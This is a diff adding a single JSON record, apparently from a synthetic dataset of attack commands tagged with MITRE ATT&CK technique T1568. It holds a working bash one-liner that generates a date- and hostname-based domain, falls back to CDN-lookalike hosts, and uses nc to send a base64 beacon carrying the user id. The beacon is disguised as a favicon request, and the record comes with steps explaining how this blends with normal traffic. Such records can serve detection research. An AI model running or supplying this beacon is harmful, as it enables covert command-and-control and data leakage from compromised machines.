@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"seed='news'$(date -u +%Y%m%d)$(hostname); sha=$(printf '%s' \"$seed\" | sha1sum | cut -d' ' -f1); d=\\\"${sha:0:12}.com\\\"; host=''; ip=''; for h in \\\"$d\\\" cdn-update.example.net img-cdn.example.org; do ip=$(dig +short \\\"$h\\\" | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux x86_64)\\\"; beacon=$(printf 'id=%s&ts=%s' \\\"$(id -u)\\\" \\\"$(date -u +%s)\\\" | base64 -w0); printf 'GET /favicon.ico?b=%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$beacon\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Generates a DGA-based domain from the current date and hostname, resolves it at runtime, falls back to CDN-like domains, and sends a base64 beacon via an HTTP GET to a common resource to blend with normal traffic.",
+  "rationale_steps": [
+    "Derive a DGA domain using SHA1(seed(date,hostname)) to enable dynamic resolution.",
+    "Resolve domain with dig and select a live IP; fallback to alternative CDN-like domains.",
+    "Construct a benign-looking HTTP GET to /favicon.ico with common headers.",
+    "Embed base64-encoded beacon in query and send over TCP via nc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-f38c4b79",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
